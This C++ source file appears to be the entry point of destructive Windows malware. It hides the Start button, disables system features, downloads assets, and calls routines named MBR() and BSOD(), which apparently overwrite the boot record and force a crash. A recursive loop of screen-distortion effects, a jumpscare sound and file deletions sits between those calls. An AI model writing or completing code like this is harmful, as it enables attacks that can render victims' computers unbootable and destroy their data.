#pragma comment(lib, "winmm.lib")

#include <cstdio>
#include "effect.hpp"
#include "killer.hpp"
#include "misc.hpp"

int iter;
void loop() {
    if (iter < 100) {
        Square(rand() % 255, rand() % 255, rand() % 255);
        Inversion();
        iter++;
        loop();
    }
    else if (iter < 2100) {
        Icons();
        iter++;
        loop();
    }
    else if (iter < 2200) {
        Melt();
        Inversion();
        iter++;
        loop();
    }
    else if (iter < 2350) {
        TextO(L"I want to understand why everything is so bad.");
        iter++;
        loop();
    }
    else {
        char str[] = R"(C:\Users\Public\Downloads\screamBG.bmp)";
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        PlaySound((L"C:\\Users\\Public\\Downloads\\scream.wav"), NULL, SND_FILENAME);

        remove(R"(C:\Users\Public\Downloads\screamBG.bmp)");
        remove(R"(C:\Users\Public\Downloads\scream.wav)");

        char wp[] = R"(C:\Users\Public\Downloads\WP.bmp)";
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, wp, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

        remove(R"(C:\Users\Public\Downloads\WP.bmp)");
        remove(R"(C:\Users\Public\Downloads\BG.wav)");
        remove(R"(C:\Users\Public\Downloads\icon.bmp)");
    }
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    HWND hTaskBar = FindWindow(L"Shell_TrayWnd", nullptr);
    HWND hStartButton = GetWindow(hTaskBar, GW_CHILD);

    ShowWindow(hStartButton, SW_HIDE);
    Disable();
    Download();

    char str[] = R"(C:\Users\Public\Downloads\WP.bmp)";
    PlaySound(L"C:\\Users\\Public\\Downloads\\BG.wav", nullptr, SND_LOOP | SND_ASYNC);
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    MBR();
    loop();
    BSOD();
    return 0;
}
